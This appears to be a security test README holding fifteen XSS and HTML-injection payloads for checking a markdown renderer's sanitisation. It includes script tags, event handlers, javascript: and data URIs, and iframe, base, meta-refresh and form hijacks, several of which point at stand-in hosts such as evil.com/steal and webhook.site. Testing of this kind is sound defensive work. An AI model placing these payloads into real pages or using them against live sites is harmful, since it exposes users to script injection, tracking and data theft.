# Security Test README

Original content: testgohere

---

## Test 1: HTML Script Tag
<script>alert('XSS')</script>

## Test 2: Image OnError
<img src=x onerror="alert('XSS')">

## Test 3: JavaScript Link
[Click me](javascript:alert('XSS'))

## Test 4: External Image (Tracking Pixel)
![tracker](https://webhook.site/unique-id-here)

## Test 5: SVG XSS
<svg onload="alert('XSS')">

## Test 6: Markdown Link with HTML Injection
[Safe Link](https://example.com" onclick="alert('XSS'))

## Test 7: Data URI
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>

## Test 8: Iframe Injection
<iframe src="https://evil.com"></iframe>

## Test 9: Object Tag
<object data="https://evil.com/malware.swf"></object>

## Test 10: Form Action Hijack
<form action="https://evil.com/steal">
<input type="text" name="data">
<input type="submit">
</form>

## Test 11: Base Tag Hijack
<base href="https://evil.com">

## Test 12: Meta Refresh
<meta http-equiv="refresh" content="0;url=https://evil.com">

## Test 13: CSS Expression (Legacy)
<div style="background:url(javascript:alert('XSS'))">

## Test 14: Event Handlers
<div onmouseover="alert('XSS')">Hover me</div>

## Test 15: Anchor Name XSS
<a name="<script>alert('XSS')</script>">anchor</a>
